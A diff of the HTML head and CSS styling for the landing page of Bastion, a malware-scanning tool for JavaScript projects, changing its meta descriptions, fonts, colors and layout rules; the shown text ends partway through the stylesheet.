@@ -1,1297 +1,627 @@
 <!doctype html>
 <html lang="en">
 <head>
+<title>Bastion</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Bastion — Stop hidden malware before it runs</title>
-<meta name="description" content="Bastion stops malware hidden in JavaScript projects before it runs. When something gets in, it investigates, contains it and tells you exactly what’s left to do. A macOS app, a command-line tool and an MCP server for AI agents. Free and open source.">
-<meta name="theme-color" content="#0A0B0D">
+<meta name="description" content="Bastion stops malware hidden in your JavaScript projects — in build configs, install scripts and old branches — before npm runs it, and shows you the exact line and the fix. Free and open source for macOS.">
+<meta name="theme-color" content="#060607">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Bastion — Stop hidden malware before it runs">
-<meta property="og:description" content="An agentic security tool for developers. It stops hidden malware in your JavaScript projects before it runs, and works the incident when something gets in.">
-<!-- Most link previews need an absolute URL here; update it once the site has a domain. -->
+<meta property="og:title" content="Bastion — stop hidden malware before it runs">
+<meta property="og:description" content="Finds code hidden 2,000 characters off-screen in your config files, install scripts and branches. Stops it, proves it, fixes it. Free and open source for macOS.">
 <meta property="og:image" content="assets/og.png">
 <meta name="twitter:card" content="summary_large_image">
 <link rel="icon" type="image/png" href="assets/favicon.png">
 <link rel="apple-touch-icon" href="assets/icon.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fragment+Mono&family=Mona+Sans:wdth,wght@75..125,200..900&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=Geist+Mono:wght@400;500&family=Instrument+Serif:ital@0;1&display=swap">
 <style>
-:root {
-  color-scheme: dark;
-  /* Colors are the app's own tokens (app/SecurityGuard.swift, enum DT),
-     plus a deeper page ground so app screenshots read as objects. */
-  --page: #0A0B0D;
-  --bg: #0E0F11;
-  --surface: #1A1B1E;
-  --surface2: #222327;
-  --border: #2B2C31;
-  --hairline: #1F2024;
-  --text: #EDEEF0;
-  --dim: #8A8D95;
-  --faint: #5D6068;
-  --accent: #5E6AD2;
-  --accent-hover: #6C78DE;
-  --accent-hi: #8E97F2;
-  --green: #4CB782;
-  --orange: #F2994A;
-  --red: #EB5757;
-  --red-text: #F59A9A;
-  --code: #C9CCD3;
-  --card-line: rgba(255, 255, 255, .07);
-  --card-bg: linear-gradient(180deg, rgba(255, 255, 255, .032), rgba(255, 255, 255, .008));
+  :root {
+    color-scheme: dark;
+    --bg: #060607;
+    --surface: #0c0d0f;
+    --raised: #131417;
+    --line: rgba(255, 255, 255, 0.08);
+    --line-strong: rgba(255, 255, 255, 0.14);
+    --text: #f2f1ee;
+    --dim: #9a9da2;
+    --faint: #686b71;
+    --red: #ff5a5f;
+    --red-soft: rgba(255, 90, 95, 0.12);
+    --green: #5ad19a;
+    --amber: #f2a65a;
+    --display: "Instrument Serif", "Iowan Old Style", "Palatino Linotype", Georgia, serif;
+    --sans: "Geist", ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
+    --mono: "Geist Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    --gutter: clamp(16px, 4vw, 32px);
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0; background: var(--bg); color: var(--text);
+    font: 400 16px/1.6 var(--sans); -webkit-font-smoothing: antialiased;
+    padding-inline: var(--gutter);
+    overflow-x: hidden;
+  }
+  a { color: inherit; }
+  code { font-family: var(--mono); font-size: 0.9em; }
+  img { max-width: 100%; display: block; }
+  :focus-visible { outline: 2px solid var(--text); outline-offset: 3px; border-radius: 6px; }
+  .wrap { max-width: 1120px; margin-inline: auto; }
 
-  --sans: "Mona Sans", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-  --mono: "Fragment Mono", ui-monospace, "SF Mono", SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+  /* nav */
+  .nav {
+    position: sticky; top: env(safe-area-inset-top, 0px); z-index: 10;
+    margin-inline: calc(var(--gutter) * -1); padding-inline: var(--gutter);
+    background: rgba(6, 6, 7, 0.74); backdrop-filter: saturate(140%) blur(14px); -webkit-backdrop-filter: saturate(140%) blur(14px);
+    border-bottom: 1px solid var(--line);
+  }
+  .nav .wrap { display: flex; align-items: center; gap: 28px; height: 60px; }
+  .brand { display: inline-flex; align-items: center; gap: 9px; text-decoration: none; font-weight: 600; letter-spacing: -0.01em; }
+  .nav-links { display: flex; gap: 24px; margin-left: 6px; }
+  .nav-links a { color: var(--dim); text-decoration: none; font-size: 14px; }
+  .nav-links a:hover { color: var(--text); }
+  .spacer { flex: 1; }
+  .nav-actions { display: flex; gap: 10px; }
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    height: 40px; padding-inline: 18px; border-radius: 999px;
+    font: 500 14px/1 var(--sans); text-decoration: none; white-space: nowrap; cursor: pointer;
+    border: 1px solid var(--line-strong); color: var(--text); background: transparent;
+    transition: background 0.15s ease, border-color 0.15s ease;
+  }
+  .btn:hover { background: rgba(255, 255, 255, 0.05); border-color: rgba(255, 255, 255, 0.26); }
+  .btn.solid { background: var(--text); color: #0a0a0b; border-color: var(--text); }
+  .btn.solid:hover { background: #ffffff; }
+  .btn.small { height: 34px; padding-inline: 14px; font-size: 13.5px; }
 
-  --maxw: 1200px;
-  --gutter: clamp(16px, 4vw, 32px);
-  --section: clamp(96px, 12vw, 160px);
-}
+  /* type */
+  h1, h2 {
+    font-family: var(--display); font-weight: 400; letter-spacing: -0.012em; margin: 0; text-wrap: balance;
+    background: linear-gradient(to right bottom, #ffffff 35%, rgba(255, 255, 255, 0.52));
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  h1 { font-size: clamp(3.1rem, 7vw, 5.5rem); line-height: 0.98; padding-bottom: 0.06em; }
+  h2 { font-size: clamp(2.3rem, 4.8vw, 3.6rem); line-height: 1.04; padding-bottom: 0.06em; }
+  h1 em, h2 em { font-style: italic; }
+  h3 { margin: 0; font-size: 1rem; font-weight: 600; letter-spacing: -0.005em; }
+  .lede { color: var(--dim); font-size: clamp(1.02rem, 1.4vw, 1.14rem); max-width: 34em; margin: 0; text-wrap: pretty; }
+  .eyebrow { font: 500 12px/1 var(--mono); letter-spacing: 0.08em; text-transform: uppercase; color: var(--faint); margin: 0; }
 
-*, *::before, *::after { box-sizing: border-box; }
-html { scroll-behavior: smooth; scroll-padding-top: 76px; -webkit-text-size-adjust: 100%; }
-body {
-  margin: 0;
-  background: var(--page);
-  color: var(--text);
-  font: 400 16px/1.6 var(--sans);
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-}
-img { display: block; max-width: 100%; height: auto; }
-svg { display: block; }
-a { color: inherit; text-decoration: none; }
-p, h1, h2, h3, figure, ul, ol { margin: 0; }
-ul, ol { padding: 0; list-style: none; }
-code, pre, kbd { font-family: var(--mono); }
-fieldset { margin: 0; padding: 0; border: 0; min-inline-size: 0; }
-[hidden] { display: none !important; }
-::selection { background: rgba(94, 106, 210, .45); color: #fff; }
-:focus-visible { outline: 2px solid var(--accent-hi); outline-offset: 3px; border-radius: 4px; }
-.skip { position: absolute; left: 12px; top: -60px; z-index: 100; padding: 8px 12px; border-radius: 8px; background: var(--text); color: var(--page); font-size: 14px; }
-.skip:focus { top: 12px; }
+  section { padding-block: clamp(64px, 8.5vw, 112px); }
+  .rule { height: 1px; border: 0; margin: 0; background: linear-gradient(90deg, transparent, var(--line-strong) 20%, var(--line-strong) 80%, transparent); }
+  .head { display: grid; gap: 18px; margin-bottom: clamp(36px, 5vw, 56px); }
+  .head.center { text-align: center; justify-items: center; }
+  .head.center .lede { margin-inline: auto; }
 
-/* layout */
-.wrap { width: 100%; max-width: var(--maxw); margin-inline: auto; padding-inline: var(--gutter); }
-.section { padding-block: var(--section); }
-.ruled { border-top: 1px solid var(--hairline); }
+  /* hero */
+  .hero { position: relative; padding-block: clamp(56px, 8vw, 104px) clamp(56px, 8vw, 96px); isolation: isolate; }
+  .hero::before {
+    content: ""; position: absolute; inset: -60px -40px auto -40px; height: 640px; pointer-events: none; z-index: -1;
+    background:
+      radial-gradient(520px 280px at 74% 24%, rgba(255, 255, 255, 0.07), transparent 70%),
+      linear-gradient(118deg, transparent 44%, rgba(255, 255, 255, 0.035) 51%, transparent 58%);
+  }
+  .hero .wrap { display: grid; grid-template-columns: minmax(0, 1.02fr) minmax(0, 1fr); gap: clamp(32px, 5vw, 72px); align-items: center; }
+  .hero-copy { display: grid; gap: 26px; justify-items: start; }
+  .badge {
+    display: inline-flex; align-items: center; gap: 8px; min-height: 30px; padding: 4px 10px 4px 12px; border-radius: 999px;
+    border: 1px solid var(--line-strong); background: rgba(255, 255, 255, 0.03);
+    font-size: 13px; color: var(--dim); text-decoration: none;
+  }
+  .badge b { color: var(--text); font-weight: 500; }
+  .badge:hover { border-color: rgba(255, 255, 255, 0.26); color: var(--text); }
+  .actions { display: flex; flex-wrap: wrap; gap: 12px; }
+  .meta { margin: 0; color: var(--faint); font-size: 13.5px; display: flex; flex-wrap: wrap; gap: 4px 0; }
+  .meta span + span::before { content: "·"; margin-inline: 8px; }
 
-/* type */
-.h1, .h2 { font-weight: 620; font-stretch: 92%; line-height: 1.04; letter-spacing: -.034em; text-wrap: balance; }
-.h1 { font-size: clamp(2.6rem, 1.25rem + 4.9vw, 4.75rem); line-height: 1; letter-spacing: -.04em; }
-.h2 { font-size: clamp(2rem, 1.3rem + 2.5vw, 3.25rem); }
-.grad {
-  background: linear-gradient(172deg, #fff 18%, rgba(237, 238, 240, .56) 96%);
-  -webkit-background-clip: text; background-clip: text; color: transparent;
-  padding-bottom: .08em; margin-bottom: -.08em;
-}
-.h3 { font-size: 1.0625rem; font-weight: 600; letter-spacing: -.01em; line-height: 1.35; }
-.lead { font-size: clamp(1.0625rem, 1rem + .28vw, 1.1875rem); line-height: 1.6; color: var(--dim); max-width: 34em; text-wrap: pretty; }
-.eyebrow { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font: 13px/1.4 var(--mono); color: var(--dim); }
-.eyebrow b { font-weight: 400; color: var(--accent-hi); }
-.c { font: .86em var(--mono); padding: .1em .4em; border-radius: 5px; background: rgba(255, 255, 255, .055); border: 1px solid rgba(255, 255, 255, .06); color: var(--text); white-space: nowrap; }
-.head { display: grid; gap: 20px; align-content: start; max-width: 780px; }
-.head .eyebrow { margin-bottom: 0; }
-.head-split { display: grid; grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); gap: 24px 72px; align-items: end; }
-.meta { display: flex; flex-wrap: wrap; row-gap: 4px; font: 12.5px/1.6 var(--mono); color: var(--dim); }
-.meta span + span::before { content: "·"; margin-inline: 10px; color: var(--faint); }
+  /* hero visual: a config that looks clean, and what Bastion sees in it */
+  .ide {
+    margin: 0; border: 1px solid var(--line-strong); border-radius: 14px; overflow: hidden;
+    background: linear-gradient(180deg, #0e0f11, #0a0b0c);
+    box-shadow: 0 40px 120px -40px rgba(0, 0, 0, 0.9);
+  }
+  .ide-top { display: flex; align-items: center; gap: 12px; height: 40px; padding-inline: 14px; border-bottom: 1px solid var(--line); }
+  .lights { display: inline-flex; gap: 7px; }
+  .lights i { width: 11px; height: 11px; border-radius: 50%; background: #2a2b2f; }
+  .ide-file { font: 400 12.5px/1 var(--mono); color: var(--faint); }
+  .ide-file b { color: var(--text); font-weight: 500; }
+  .ide-code { padding: 16px 0 18px; font: 400 13px/1.75 var(--mono); overflow: hidden; }
+  .ln { display: grid; grid-template-columns: 44px 1fr; white-space: pre; }
+  .ln .n { color: #45474d; text-align: right; padding-right: 16px; user-select: none; }
+  .ln .c { color: #d7d6d2; position: relative; }
+  .k { color: #c7a2ff; } .s { color: #9fd6a8; }
+  .ln.hit { background: linear-gradient(90deg, transparent, var(--red-soft) 35%); }
+  .ln.hit .n { color: var(--red); }
+  .trail { display: inline-block; vertical-align: middle; height: 0; width: calc(100% - 8.6em); margin-left: 8px;
+    border-top: 1px dashed rgba(255, 90, 95, 0.8); transform-origin: left; }
+  .offscreen { position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    font: 500 11px/1 var(--mono); color: var(--red); background: #1a0d0e; border: 1px solid rgba(255, 90, 95, 0.4);
+    padding: 4px 7px; border-radius: 6px; }
+  .ide-panel { border-top: 1px solid var(--line); background: #08090a; padding: 14px 16px 16px; display: grid; gap: 12px; }
+  .panel-head { font-size: 12.5px; color: var(--dim); }
+  .panel-head b { color: var(--text); font-weight: 600; }
+  .problem { display: grid; grid-template-columns: 10px 1fr; gap: 10px; align-items: start; }
+  .problem .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); margin-top: 7px; box-shadow: 0 0 0 4px var(--red-soft); }
+  .problem p { margin: 0; }
+  .p-title { font-size: 14px; font-weight: 500; }
+  .p-code { font: 400 12.5px/1.6 var(--mono); color: var(--red); overflow-wrap: anywhere; }
+  .p-meta { font-size: 12.5px; color: var(--dim); }
+  .blocked { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--dim);
+    border: 1px solid var(--line); border-radius: 9px; padding: 9px 12px; background: var(--surface); }
+  .blocked .x { width: 18px; height: 18px; border-radius: 50%; display: grid; place-items: center; background: var(--red); color: #1a0506; font: 700 10px/1 var(--sans); flex: none; }
+  .blocked code { color: var(--text); }
 
-/* buttons */
-.btn {
-  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-  height: 42px; padding-inline: 18px; border-radius: 9px; border: 1px solid transparent;
-  font: 500 15px/1 var(--sans); letter-spacing: -.005em; white-space: nowrap; cursor: pointer;
-  transition: background-color .15s, border-color .15s, color .15s, transform .15s;
-}
-.btn:active { transform: translateY(1px); }
-.btn svg { flex: none; }
-.btn-primary { background: var(--accent); color: #fff; box-shadow: inset 0 1px 0 rgba(255, 255, 255, .2), 0 1px 2px rgba(0, 0, 0, .5), 0 8px 24px -8px rgba(94, 106, 210, .6); }
-.btn-primary:hover { background: var(--accent-hover); }
-.btn-ghost { background: rgba(255, 255, 255, .035); border-color: var(--border); color: var(--text); }
-.btn-ghost:hover { background: rgba(255, 255, 255, .07); border-color: #3B3D44; }
-.btn-sm { height: 32px; padding-inline: 12px; border-radius: 8px; font-size: 13.5px; }
+  /* works with */
+  .with { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 26px; padding: 26px 0; margin: 0;
+    border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); list-style: none;
+    font: 400 13px/1 var(--mono); color: var(--faint); }
+  .with li:first-child { color: var(--dim); }
 
-/* nav */
-.nav {
-  position: sticky; top: env(safe-area-inset-top, 0px); z-index: 50;
-  background: rgba(10, 11, 13, .72);
-  -webkit-backdrop-filter: saturate(160%) blur(16px); backdrop-filter: saturate(160%) blur(16px);
-  border-bottom: 1px solid rgba(255, 255, 255, .06);
-}
-.nav-bar { display: flex; align-items: center; gap: 28px; height: 60px; }
-.brand { display: inline-flex; align-items: center; gap: 10px; font-size: 16px; font-weight: 600; letter-spacing: -.015em; }
-.brand img { width: 24px; height: 24px; border-radius: 6px; }
-.nav-links { display: flex; gap: 2px; }
-.nav-links a { display: block; padding: 6px 11px; border-radius: 7px; font-size: 14px; color: var(--dim); transition: color .15s, background-color .15s; }
-.nav-links a:hover { color: var(--text); background: rgba(255, 255, 255, .045); }
-.nav-end { margin-left: auto; display: flex; align-items: center; gap: 4px; }
-.nav-gh { display: inline-flex; align-items: center; gap: 7px; padding: 6px 10px; border-radius: 7px; font-size: 14px; color: var(--dim); transition: color .15s; }
-.nav-gh:hover { color: var(--text); }
+  /* where it hides */
+  .spots { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); border-top: 1px solid var(--line); }
+  .spot { padding: 28px 28px 8px 0; display: grid; gap: 14px; align-content: start; min-width: 0; }
+  .spot + .spot { padding-left: 28px; border-left: 1px solid var(--line); }
+  .spot p { margin: 0; color: var(--dim); }
+  .file { display: flex; gap: 6px; flex-wrap: wrap; }
+  .file code { font-size: 12px; color: var(--text); background: var(--raised); border: 1px solid var(--line); border-radius: 6px; padding: 3px 7px; }
+  .snip { font: 400 12.5px/1.7 var(--mono); color: #cfcdc8; background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; white-space: pre-wrap; overflow-wrap: anywhere; margin: 0; }
+  .snip .red { color: var(--red); }
+  .snip .mute { color: var(--faint); }
 
-/* hero */
-.hero { position: relative; isolation: isolate; overflow-x: clip; padding-top: clamp(56px, 9vw, 120px); }
-.hero::before {
-  content: ""; position: absolute; z-index: -1; left: 50%; top: -420px; width: min(1400px, 140vw); height: 900px; transform: translateX(-50%);
-  background: radial-gradient(closest-side, rgba(94, 106, 210, .22), rgba(94, 106, 210, .06) 55%, transparent);
-  pointer-events: none;
-}
-.pill {
-  display: inline-flex; align-items: center; gap: 10px; max-width: 100%;
-  padding: 4px 12px 4px 4px; border-radius: 999px; border: 1px solid rgba(255, 255, 255, .08); background: rgba(255, 255, 255, .03);
-  font-size: 13.5px; line-height: 1.4; color: var(--dim); transition: color .15s, border-color .15s;
-}
-.pill:hover { color: var(--text); border-color: rgba(255, 255, 255, .16); }
-.pill-tag { flex: none; padding: 2px 8px; border-radius: 999px; background: rgba(94, 106, 210, .22); color: var(--accent-hi); font: 12px/1.5 var(--mono); }
-.pill-text { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-.pill svg { flex: none; }
-.hero .h1 { margin-top: 28px; max-width: 12.5em; }
-.hero-row { margin-top: 28px; display: flex; flex-wrap: wrap; align-items: flex-end; justify-content: space-between; gap: 28px 56px; }
-.hero-lead { max-width: 35em; }
-.hero-actions { display: flex; flex-wrap: wrap; gap: 10px; }
-.hero .meta { margin-top: 22px; }
-.hero-shot {
-  position: relative; margin-top: clamp(56px, 8vw, 96px);
-  -webkit-mask-image: linear-gradient(to bottom, #000 50%, transparent 88%);
-  mask-image: linear-gradient(to bottom, #000 50%, transparent 88%);
-}
-.hero-shot::before { content: ""; position: absolute; z-index: -1; inset: 2% 14% auto; height: 40%; background: rgba(94, 106, 210, .32); filter: blur(90px); }
-.hero-shot img { width: 100%; filter: drop-shadow(0 24px 64px rgba(0, 0, 0, .55)); }
-@media (prefers-reduced-motion: no-preference) {
-  .hero-shot { transform-origin: 50% 0; animation: settle 1.6s cubic-bezier(.16, 1, .3, 1) both; }
-}
-@keyframes settle { from { transform: perspective(1600px) rotateX(18deg) translateY(24px) scale(.97); } to { transform: none; } }
+  /* stops · proves · fixes */
+  .trio { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 16px; }
+  .tile { border: 1px solid var(--line); border-radius: 16px; background: linear-gradient(180deg, #0c0d0f, #08090a); overflow: hidden; display: grid; grid-template-rows: auto 1fr; min-width: 0; }
+  .tile .demo { padding: 20px; border-bottom: 1px solid var(--line); min-height: 200px; display: grid; align-content: center; gap: 10px;
+    background: radial-gradient(360px 160px at 50% 0%, rgba(255, 255, 255, 0.045), transparent 70%); min-width: 0; }
+  .tile .copy { padding: 20px 22px 24px; display: grid; gap: 8px; align-content: start; }
+  .tile .copy p { margin: 0; color: var(--dim); font-size: 15px; }
+  .term { font: 400 12.5px/1.75 var(--mono); color: #cfcdc8; white-space: pre-wrap; margin: 0; }
+  .term .pr { color: var(--faint); }
+  .term .no { color: var(--red); }
+  .term .ok { color: var(--green); }
+  .proof { font: 400 12.5px/1.65 var(--mono); color: #d9d7d2; border: 1px solid var(--line); border-radius: 10px; padding: 12px; background: #060607; margin: 0; overflow-wrap: anywhere; }
+  .proof .red { color: var(--red); }
+  .chips { display: flex; flex-wrap: wrap; gap: 6px; }
+  .chip { font-size: 12px; color: var(--text); border: 1px solid var(--line-strong); border-radius: 7px; padding: 5px 9px; background: var(--raised); }
+  .fixes { display: grid; gap: 8px; margin: 0; padding: 0; list-style: none; }
+  .fixes li { display: flex; align-items: center; justify-content: space-between; gap: 10px; border: 1px solid var(--line); border-radius: 10px; padding: 9px 10px 9px 12px; background: #08090a; font-size: 13px; min-width: 0; }
+  .fixes li span { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .fixes li b { flex: none; font-weight: 500; font-size: 12px; color: #0a0a0b; background: var(--text); border-radius: 7px; padding: 5px 9px; }
+  .fixes li.done { color: var(--faint); }
+  .fixes li.done span { text-decoration: line-through; }
+  .fixes li.done b { background: transparent; color: var(--green); padding-inline: 0; }
 
-/* where it runs */
-.runs { position: relative; margin-top: calc(-1 * clamp(24px, 4vw, 64px)); }
-.runs-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); border-block: 1px solid var(--hairline); }
-.runs-col { display: grid; gap: 8px; align-content: start; padding: 22px 24px; border-left: 1px solid var(--hairline); }
-.runs-col:first-child { border-left: 0; padding-left: 0; }
-.runs-label { font: 12.5px/1.4 var(--mono); color: var(--dim); }
-.runs-names { display: flex; flex-wrap: wrap; gap: 4px 16px; font-size: 15.5px; font-weight: 500; font-stretch: 95%; color: #C5C7CD; }
+  /* product shot */
+  .shot { margin: 0; border: 1px solid var(--line-strong); border-radius: 14px; overflow: hidden; background: #0e0f11;
+    box-shadow: 0 60px 160px -50px rgba(0, 0, 0, 0.95), 0 0 140px -60px rgba(255, 255, 255, 0.12); }
+  .shot .ide-top { background: #0b0c0e; }
+  .shot img { width: 100%; height: auto; aspect-ratio: 2360 / 1520; }
+  .notes { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 28px; margin-top: 36px; }
+  .notes div { display: grid; gap: 8px; align-content: start; }
+  .notes p { margin: 0; color: var(--dim); font-size: 15px; }
+  .state { display: flex; gap: 6px; flex-wrap: wrap; }
+  .state span { font-size: 12px; border-radius: 999px; padding: 3px 9px; border: 1px solid var(--line); }
+  .state .g { color: var(--green); } .state .o { color: var(--amber); } .state .r { color: var(--red); }
 
-/* the attack */
-.vectors { margin-top: clamp(48px, 6vw, 72px); display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 16px; }
-.vector { display: grid; grid-row: span 4; grid-template-rows: subgrid; row-gap: 18px; align-content: start; min-width: 0; padding: 20px; border-radius: 16px; border: 1px solid var(--card-line); background: var(--card-bg); }
-.file { display: flex; align-items: center; gap: 8px; font: 13.5px/1.4 var(--mono); color: var(--text); }
-.file svg { flex: none; color: var(--red); }
-.snippet { padding-block: 12px; border-radius: 10px; border: 1px solid var(--hairline); background: var(--bg); font: 12px/1.8 var(--mono); color: var(--code); overflow-x: auto; }
-.snippet .l { display: block; width: max-content; min-width: 100%; padding-inline: 12px 16px; white-space: pre; }
-.snippet i { display: inline-block; width: 1ch; margin-right: 14px; font-style: normal; text-align: right; color: var(--faint); user-select: none; }
-.snippet .s { color: #B7BEF7; }
-.snippet .k { color: #C3A6FF; }
-.snippet .hit { background: rgba(235, 87, 87, .1); box-shadow: inset 2px 0 0 var(--red); }
-.far { display: inline-block; width: 3.5em; height: 1px; margin-inline: 10px 8px; vertical-align: middle; background: repeating-linear-gradient(90deg, rgba(235, 87, 87, .65) 0 2px, transparent 2px 5px); }
-.flag { color: var(--red-text); }
-.runs-on { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 8px; font-size: 14px; color: var(--dim); }
-.runs-on .c { font-size: 12.5px; }
-.vector-desc { font-size: 15px; color: var(--dim); }
+  /* developers */
+  .dev { border: 1px solid var(--line-strong); border-radius: 16px; overflow: hidden; background: #0a0b0c; max-width: 900px; margin-inline: auto; }
+  .tabs { display: flex; gap: 4px; padding: 8px; border-bottom: 1px solid var(--line); overflow-x: auto; }
+  .tab { flex: none; font: 500 13px/1 var(--sans); color: var(--dim); background: transparent; border: 1px solid transparent; border-radius: 9px; height: 34px; padding-inline: 14px; cursor: pointer; }
+  .tab:hover { color: var(--text); }
+  .tab[aria-selected="true"] { color: var(--text); background: var(--raised); border-color: var(--line); }
+  .panel { position: relative; }
+  .panel pre { margin: 0; padding: 22px 22px 26px; overflow-x: auto; font: 400 13.5px/1.8 var(--mono); color: #d4d2cd; }
+  .panel .cm { color: var(--faint); }
+  .panel .pr { color: var(--faint); user-select: none; }
+  .panel .st { color: #9fd6a8; }
+  .panel .ky { color: #c7a2ff; }
+  .panel .ok { color: var(--green); }
+  .panel .or { color: var(--amber); }
+  .copy-btn { position: absolute; top: 14px; right: 14px; background: #0a0b0c; }
 
-/* four layers */
-.layers { margin-top: clamp(40px, 6vw, 72px); display: grid; grid-template-columns: minmax(0, 1.1fr) minmax(0, 1fr); gap: clamp(32px, 5vw, 80px); align-items: center; }
-.fort-svg { width: 100%; max-width: 580px; height: auto; margin-inline: auto; overflow: visible; }
-.fort-svg .bezel { fill: none; stroke: #2A2B31; stroke-dasharray: 2 6; }
-.fort-svg .tick { stroke: #2A2B31; }
-.fort-svg .tick.major { stroke: #474A53; }
-.fort-svg .cross { stroke: #1F2025; stroke-dasharray: 1 5; }
-.fort-svg .floor { fill: rgba(142, 151, 242, .03); }
-.fort-svg .wall { fill: none; stroke: #4A4D57; stroke-width: 1.2; transition: stroke .25s, stroke-width .25s; }
-.fort-svg .wall-inner { fill: none; stroke: #2A2C32; }
-.fort-svg .ravelin { fill: none; stroke: #3C3E46; }
-.fort-svg .bezel, .fort-svg .tick, .fort-svg .cross, .fort-svg .wall, .fort-svg .wall-inner, .fort-svg .ravelin, .fort-svg .sweep-edge { vector-effect: non-scaling-stroke; }
-.fort-svg .ring-label { font: 10px var(--mono); fill: var(--dim); text-anchor: middle; paint-order: stroke; stroke: var(--page); stroke-width: 4px; stroke-linejoin: round; transition: fill .25s; }
-.fort-svg .sweep-edge { stroke: var(--accent-hi); stroke-opacity: .75; }
-.fort-svg .keep path { fill: rgba(94, 106, 210, .18); stroke: var(--accent-hi); stroke-width: 1.2; stroke-linejoin: round; }
-.fort-svg .keep .keep-check { fill: none; stroke-width: 2; stroke-linecap: round; }
-.fort-svg .blip-dot { fill: var(--red); }
-.fort-svg .blip-ring { fill: none; stroke: var(--red); stroke-width: 1.2; }
-.fort-svg[data-active="1"] .wall-1, .fort-svg[data-active="2"] .wall-2,
-.fort-svg[data-active="3"] .wall-3, .fort-svg[data-active="4"] .wall-4 { stroke: var(--accent-hi); stroke-width: 1.8; }
-.fort-svg[data-active="1"] .label-1, .fort-svg[data-active="2"] .label-2,
-.fort-svg[data-active="3"] .label-3, .fort-svg[data-active="4"] .label-4 { fill: var(--accent-hi); }
-.sweep { transform-box: view-box; transform-origin: 0 0; animation: sweep 12s linear infinite; }
-@keyframes sweep { to { transform: rotate(360deg); } }
-/* The blip sits at 54°. The sweep starts at 0° and reaches it 1.8 s into each 12 s turn. */
-.blip-dot, .blip-ring { animation-duration: 12s; animation-iteration-count: infinite; animation-delay: -10.2s; }
-.blip-dot { animation-name: blip; animation-timing-function: ease-out; }
-.blip-ring { transform-box: fill-box; transform-origin: center; animation-name: ping; animation-timing-function: cubic-bezier(.2, .7, .3, 1); }
-@keyframes blip { 0% { opacity: 1; } 40%, 100% { opacity: .22; } }
-@keyframes ping { 0% { opacity: .9; transform: scale(1); } 12%, 100% { opacity: 0; transform: scale(3.4); } }
-.fig-cap { margin-top: 14px; text-align: center; font: 12.5px/1.5 var(--mono); color: var(--dim); text-wrap: balance; }
-.fig-cap b { margin-right: 8px; font-weight: 400; color: var(--faint); }
-.layer { display: grid; grid-template-columns: 3em minmax(0, 1fr); gap: 6px 14px; padding-block: 22px; border-top: 1px solid var(--hairline); transition: opacity .2s; }
-.layer:last-child { border-bottom: 1px solid var(--hairline); }
-.layer-num { grid-row: span 3; font: 13px/1.75 var(--mono); color: var(--accent-hi); }
-.layer p { font-size: 15px; color: var(--dim); }
-.parts { display: flex; flex-wrap: wrap; gap: 4px 14px; margin-top: 4px; font: 12px/1.6 var(--mono); color: var(--dim); }
-.parts b { margin-right: 6px; font-weight: 400; color: var(--faint); }
-.parts a { text-decoration: underline; text-decoration-color: rgba(255, 255, 255, .2); text-underline-offset: 3px; transition: color .15s; }
-.parts a:hover { color: var(--text); }
-.layer-list.has-active .layer:not(.is-active) { opacity: .45; }
+  /* principles */
+  .rules { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); border-top: 1px solid var(--line); border-left: 1px solid var(--line); }
+  .rules div { padding: 28px; border-right: 1px solid var(--line); border-bottom: 1px solid var(--line); display: grid; gap: 10px; align-content: start; }
+  .rules p { margin: 0; color: var(--dim); font-size: 15px; }
+  .rules svg { color: var(--text); opacity: 0.85; }
 
-/* responder */
-.mono-link { display: inline-flex; align-items: center; gap: 6px; margin-top: 16px; font: 13px/1.4 var(--mono); color: var(--accent-hi); }
-.mono-link:hover { color: var(--text); }
-.fig-panel {
-  position: relative; margin-top: clamp(48px, 6vw, 72px);
-  display: grid; grid-template-columns: minmax(0, 360px) minmax(0, 1fr);
-  border-radius: 18px; border: 1px solid var(--card-line); background: var(--card-bg); overflow: hidden;
-}
-.fig-tag { position: absolute; top: 18px; left: 22px; font: 11.5px/1 var(--mono); letter-spacing: .08em; color: var(--faint); }
-.steps { display: grid; align-content: start; gap: 4px; padding: 52px 20px 24px; }
-.step { display: grid; grid-template-columns: 2.6em minmax(0, 1fr); gap: 4px 10px; padding: 14px 12px; border-radius: 10px; }
-.step-num { grid-row: span 2; font: 12.5px/1.65 var(--mono); color: var(--accent-hi); }
-.step h3 { font: 12.5px/1.65 var(--mono); letter-spacing: .07em; text-transform: uppercase; color: var(--text); }
-.step p { font-size: 14px; line-height: 1.55; color: var(--dim); }
-.fig-shot {
